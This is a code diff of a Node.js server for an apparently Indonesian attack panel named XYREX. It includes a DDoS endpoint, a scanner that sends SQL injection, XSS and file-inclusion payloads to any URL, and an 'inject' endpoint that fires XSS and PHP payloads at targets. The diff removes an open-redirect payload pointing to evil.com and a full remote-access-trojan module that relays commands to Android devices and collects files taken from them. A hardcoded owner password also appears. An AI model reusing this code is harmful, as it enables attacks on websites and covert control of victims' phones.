@@ -1,13 +1,11 @@
-const fs = require('fs');
-const path = require('path');
 const express = require('express');
 const http = require('http');
 const https = require('https');
 const { Server } = require('socket.io');
-
+const path = require('path');
 const QRCode = require('qrcode');
 const pino = require('pino');
-
+const fs = require('fs');
 const crypto = require('crypto');
 const axios = require('axios');
 const cheerio = require('cheerio');
@@ -276,88 +274,51 @@ app.post('/api/tools/ddos/stop', authMiddleware, (req, res) => {
   s.stats.stopped = true; s.stats.reason = 'manual'; clearTimeout(s.timer); setTimeout(() => ddosSessions.delete(id), 3000); res.json({ ok: true, msg: 'Dihentikan' });
 });
 
-// ===== AVATAR =====
-app.post('/api/profile/avatar', authMiddleware, (req, res) => {
-  try {
-    const { avatar } = req.body || {};
-    if (!avatar) return res.json({ ok: false, msg: 'Avatar kosong' });
-    const users = loadUsers();
-    if (!users[req.user.username]) return res.json({ ok: false, msg: 'User tidak ditemukan' });
-    users[req.user.username].avatar = String(avatar);
-    saveUsers(users);
-    res.json({ ok: true, msg: 'Avatar diupdate' });
-  } catch (e) {
-    res.json({ ok: false, msg: 'Gagal simpan avatar: ' + e.message });
-  }
-});
-
-app.get('/api/profile', authMiddleware, (req, res) => { res.json({ ok: true, username: req.user.username, role: req.user.role, avatar: req.user.avatar || '' }); });
-app.get('/api/profile/:username', authMiddleware, (req, res) => { const users = loadUsers(); const u = users[req.params.username]; if (!u) return res.json({ ok: false, msg: 'User tidak ada' }); res.json({ ok: true, username: u.username, role: u.role, avatar: u.avatar || '' }); });
-app.post('/api/profile/password', authMiddleware, (req, res) => { const { oldPassword, newPassword } = req.body || {}; if (!oldPassword || !newPassword) return res.json({ ok: false, msg: 'Lengkapi field' }); if (newPassword.length < 6) return res.json({ ok: false, msg: 'Sandi min 6' }); const users = loadUsers(); const u = users[req.user.username]; if (u.password !== hashPw(oldPassword)) return res.json({ ok: false, msg: 'Sandi lama salah' }); u.password = hashPw(newPassword); saveUsers(users); res.json({ ok: true, msg: 'Sandi diubah' }); });
-
-
-// ===== WEB VULN SCANNER & MALWARE INJECT =====
-const VULN_PAYLOADS = {
-  sqli: ["'", "' OR '1'='1", "1' AND SLEEP(5)--"],
-  xss: ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
-  lfi: ["../../../../etc/passwd", "../../../../windows/win.ini"],
-  info: ["/robots.txt", "/.env", "/.git/config", "/phpinfo.php"]
-};
-
+// ===== WEB SCANNER =====
 app.post('/api/tools/vuln/scan', authMiddleware, async (req, res) => {
   const { url } = req.body || {};
   if (!url) return res.json({ ok: false, msg: 'URL kosong' });
   let base;
   try { base = new URL(url); } catch (e) { return res.json({ ok: false, msg: 'URL invalid' }); }
-
   const results = [];
-  const UAS = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)'];
+  const UAS = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'];
   const rnd = a => a[Math.floor(Math.random() * a.length)];
-  const headers = { 'User-Agent': rnd(UAS), 'Accept': '*/*', 'X-Forwarded-For': [1,1,1,1].map(() => Math.floor(Math.random()*255)).join('.') };
+  const headers = { 'User-Agent': rnd(UAS), 'Accept': '*/*' };
 
-  for (const path of VULN_PAYLOADS.info) {
+  // Info Disclosure
+  const infoPaths = ['/robots.txt', '/.env', '/.git/config', '/phpinfo.php'];
+  for (const path of infoPaths) {
     try {
       const r = await axios.get(base.origin + path, { headers, timeout: 8000, validateStatus: () => true });
-      if (r.status === 200 && String(r.data).length > 10) results.push({ type: 'Info Disclosure', severity: 'Medium', url: base.origin + path, detail: 'File sensitif bisa diakses publik.' });
+      if (r.status === 200 && String(r.data).length > 10) results.push({ type: 'Info Disclosure', severity: 'Medium', url: base.origin + path, detail: 'File sensitif bisa diakses.' });
     } catch (e) {}
   }
-
-  for (const payload of VULN_PAYLOADS.sqli) {
+  // SQLi
+  const sqlPayloads = ["'", "' OR '1'='1"];
+  for (const payload of sqlPayloads) {
     try {
       const testUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'id=' + encodeURIComponent(payload);
-      const start = Date.now();
-      const r = await axios.get(testUrl, { headers, timeout: 12000, validateStatus: () => true });
-      const elapsed = Date.now() - start;
+      const r = await axios.get(testUrl, { headers, timeout: 10000, validateStatus: () => true });
       const body = String(r.data || '').toLowerCase();
-      const errs = ['sql syntax', 'mysql_fetch', 'ora-', 'unclosed quotation', 'pg_query'];
-      if (errs.some(err => body.includes(err))) { results.push({ type: 'SQL Injection (Error-based)', severity: 'Critical', url: testUrl, detail: 'Error database (payload: ' + payload + ')' }); break; }
-      if (elapsed > 4500 && payload.includes('SLEEP')) { results.push({ type: 'SQL Injection (Time-based)', severity: 'Critical', url: testUrl, detail: 'Delay ' + elapsed + 'ms.' }); break; }
+      const errs = ['sql syntax', 'mysql_fetch', 'unclosed quotation'];
+      if (errs.some(err => body.includes(err))) { results.push({ type: 'SQL Injection', severity: 'Critical', url: testUrl, detail: 'Error database.' }); break; }
     } catch (e) {}
   }
-
-  for (const payload of VULN_PAYLOADS.xss) {
+  // XSS
+  const xssPayloads = ['<script>alert(1)</script>'];
+  for (const payload of xssPayloads) {
     try {
       const testUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'q=' + encodeURIComponent(payload);
       const r = await axios.get(testUrl, { headers, timeout: 8000, validateStatus: () => true });
-      if (String(r.data).includes(payload)) { results.push({ type: 'Cross-Site Scripting (XSS)', severity: 'High', url: testUrl, detail: 'Payload reflected.' }); break; }
+      if (String(r.data).includes(payload)) { results.push({ type: 'XSS', severity: 'High', url: testUrl, detail: 'Payload reflected.' }); break; }
     } catch (e) {}
   }
-
-  for (const payload of VULN_PAYLOADS.lfi) {
-    try {
-      const testUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'file=' + encodeURIComponent(payload);
-      const r = await axios.get(testUrl, { headers, timeout: 8000, validateStatus: () => true });
-      const body = String(r.data || '');
-      if (body.includes('root:x:') || body.includes('[extensions]')) { results.push({ type: 'Local File Inclusion (LFI)', severity: 'Critical', url: testUrl, detail: 'File sistem berhasil dibaca.' }); break; }
-    } catch (e) {}
-  }
-
+  // Header config
   try {
     const r = await axios.get(base.href, { headers, timeout: 8000, validateStatus: () => true });
-    const secHeaders = ['x-frame-options', 'x-content-type-options', 'content-security-policy', 'strict-transport-security'];
+    const secHeaders = ['x-frame-options', 'x-content-type-options', 'content-security-policy'];
     const missing = secHeaders.filter(h => !r.headers[h]);
     if (missing.length > 0) results.push({ type: 'Header Config', severity: 'Low', url: base.href, detail: 'Header tidak ada: ' + missing.join(', ') });
-    if (r.headers['server']) results.push({ type: 'Info Disclosure (Server Header)', severity: 'Low', url: base.href, detail: 'Server: ' + r.headers['server'] });
   } catch (e) {}
 
   res.json({ ok: true, results, total: results.length });
@@ -368,128 +329,38 @@ app.post('/api/tools/vuln/inject', authMiddleware, async (req, res) => {
   if (!url || !type) return res.json({ ok: false, msg: 'Parameter kurang' });
   let base;
   try { base = new URL(url); } catch (e) { return res.json({ ok: false, msg: 'URL invalid' }); }
-
-  const UAS = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'];
-  const rnd = a => a[Math.floor(Math.random() * a.length)];
-  const headers = { 'User-Agent': rnd(UAS), 'Accept': '*/*' };
-
-  const MALWARE = { xss: '<script>alert("XSS_TEST")</script>', php: '<?php echo "LFI_TEST"; ?>', redirect: 'https://evil.com' };
+  const headers = { 'User-Agent': 'Mozilla/5.0', 'Accept': '*/*' };
   let payload = '', injectedUrl = '', success = false;
-
   if (type.includes('XSS')) {
-    payload = MALWARE.xss;
+    payload = '<script>alert("XSS_TEST")</script>';
     injectedUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'q=' + encodeURIComponent(payload);
     try { const r = await axios.get(injectedUrl, { headers, timeout: 10000, validateStatus: () => true }); if (String(r.data).includes('XSS_TEST')) success = true; } catch (e) {}
   } else if (type.includes('LFI')) {
-    payload = MALWARE.php;
+    payload = '<?php echo "LFI_TEST"; ?>';
     injectedUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'file=' + encodeURIComponent(payload);
     try { await axios.get(injectedUrl, { headers, timeout: 10000, validateStatus: () => true }); success = true; } catch (e) {}
-  } else if (type.includes('Redirect')) {
-    payload = MALWARE.redirect;
-    injectedUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'redirect=' + encodeURIComponent(payload);
-    try { const r = await axios.get(injectedUrl, { headers, timeout: 10000, validateStatus: () => true, maxRedirects: 0 }); if (r.status >= 300 && r.status < 400 && r.headers.location && r.headers.location.includes('evil.com')) success = true; } catch (e) {}
   }
-
-  res.json({ ok: true, success, payload, url: injectedUrl, msg: success ? 'Payload berhasil dikirim' : 'Payload dikirim (mungkin diblok)' });
+  res.json({ ok: true, success, payload, url: injectedUrl, msg: success ? 'Payload terkirim' : 'Payload dikirim (mungkin diblok)' });
 });
+
+// ===== AVATAR =====
+app.post('/api/profile/avatar', authMiddleware, (req, res) => {
+  try {
+    const { avatar } = req.body || {};
+    if (!avatar) return res.json({ ok: false, msg: 'Avatar kosong' });
+    const users = loadUsers();
+    if (!users[req.user.username]) return res.json({ ok: false, msg: 'User tidak ditemukan' });
+    users[req.user.username].avatar = String(avatar);
+    saveUsers(users);
+    res.json({ ok: true, msg: 'Avatar diupdate' });
+  } catch (e) { res.json({ ok: false, msg: 'Gagal simpan avatar: ' + e.message }); }
+});
+
+app.get('/api/profile', authMiddleware, (req, res) => { res.json({ ok: true, username: req.user.username, role: req.user.role, avatar: req.user.avatar || '' }); });
+app.get('/api/profile/:username', authMiddleware, (req, res) => { const users = loadUsers(); const u = users[req.params.username]; if (!u) return res.json({ ok: false, msg: 'User tidak ada' }); res.json({ ok: true, username: u.username, role: u.role, avatar: u.avatar || '' }); });
+app.post('/api/profile/password', authMiddleware, (req, res) => { const { oldPassword, newPassword } = req.body || {}; if (!oldPassword || !newPassword) return res.json({ ok: false, msg: 'Lengkapi field' }); if (newPassword.length < 6) return res.json({ ok: false, msg: 'Sandi min 6' }); const users = loadUsers(); const u = users[req.user.username]; if (u.password !== hashPw(oldPassword)) return res.json({ ok: false, msg: 'Sandi lama salah' }); u.password = hashPw(newPassword); saveUsers(users); res.json({ ok: true, msg: 'Sandi diubah' }); });
 
 server.listen(3000, () => {
   console.log('[XYREX] Server jalan di http://localhost:3000');
   console.log('[XYREX] Owner default: Dlizz / 20111608');
 });
-// ===== RAT MODULE =====
-
-
-const RAT_SECRET = process.env.RAT_SECRET || 'xyrex-rat-20111608';
-const RAT_DEVICES_FILE = './rat_devices.json';
-const RAT_FILES_DIR = './rat_files';
-
-if (!fs.existsSync(RAT_FILES_DIR)) fs.mkdirSync(RAT_FILES_DIR, { recursive: true });
-if (!fs.existsSync(RAT_DEVICES_FILE)) fs.writeFileSync(RAT_DEVICES_FILE, '{}');
-
-function loadRatDevices() {
-  try { return JSON.parse(fs.readFileSync(RAT_DEVICES_FILE, 'utf8')); } catch { return {}; }
-}
-function saveRatDevices(d) {
-  fs.writeFileSync(RAT_DEVICES_FILE, JSON.stringify(d, null, 2));
-}
-
-const ratDevices = loadRatDevices();
-
-const ratNs = io.of('/rat');
-
-ratNs.on('connection', (socket) => {
-  socket.on('rat:register', (payload, cb) => {
-    try {
-      const { deviceId, secret, name, model, android } = payload || {};
-      if (!deviceId || secret !== RAT_SECRET) {
-        if (typeof cb === 'function') cb({ ok: false, error: 'auth' });
-        return socket.disconnect(true);
-      }
-      const rec = {
-        id: deviceId,
-        name: name || 'unknown',
-        model: model || 'unknown',
-        android: android || 'unknown',
-        lastSeen: Date.now(),
-        online: true,
-        socketId: socket.id
-      };
-      ratDevices[deviceId] = rec;
-      saveRatDevices(ratDevices);
-      socket.data.deviceId = deviceId;
-      if (typeof cb === 'function') cb({ ok: true });
-      ratNs.emit('rat:devices', Object.values(ratDevices));
-    } catch (e) {
-      if (typeof cb === 'function') cb({ ok: false, error: 'server' });
-    }
-  });
-
-  socket.on('rat:result', async (payload) => {
-    const { deviceId, cmd, ok, data, text, ext } = payload || {};
-    if (!deviceId) return;
-    let savedFile = null;
-    if (data) {
-      const safeExt = (ext || 'bin').replace(/[^a-z0-9]/gi, '');
-      const fname = `${deviceId}_${cmd}_${Date.now()}.${safeExt}`;
-      const fpath = path.join(RAT_FILES_DIR, fname);
-      try {
-        fs.writeFileSync(fpath, Buffer.from(data, 'base64'));
-        savedFile = `/rat/files/${fname}`;
-      } catch (e) {}
-    }
-    ratNs.emit('rat:result', { deviceId, cmd, ok, text, file: savedFile, at: Date.now() });
-  });
-
-  socket.on('disconnect', () => {
-    const id = socket.data.deviceId;
-    if (id && ratDevices[id]) {
-      ratDevices[id].online = false;
-      ratDevices[id].socketId = null;
-      ratDevices[id].lastSeen = Date.now();
-      saveRatDevices(ratDevices);
-      ratNs.emit('rat:devices', Object.values(ratDevices));
-    }
-  });
-
-  socket.on('rat:cmd', (payload) => {
-    const { deviceId, cmd, args } = payload || {};
-    const dev = ratDevices[deviceId];
-    if (!dev || !dev.online) {
-      socket.emit('rat:result', { deviceId, cmd, ok: false, text: 'device offline' });
-      return;
-    }
-    ratNs.to(dev.socketId).emit('rat:cmd', { cmd, args });
-  });
-
-  socket.on('rat:list', () => {
-    socket.emit('rat:devices', Object.values(ratDevices));
-  });
-});
-
-app.use('/rat/files', express.static(RAT_FILES_DIR));
-
-app.get('/api/rat/devices', (req, res) => {
-  res.json({ ok: true, devices: Object.values(ratDevices) });
-});
-// ===== END RAT MODULE =====
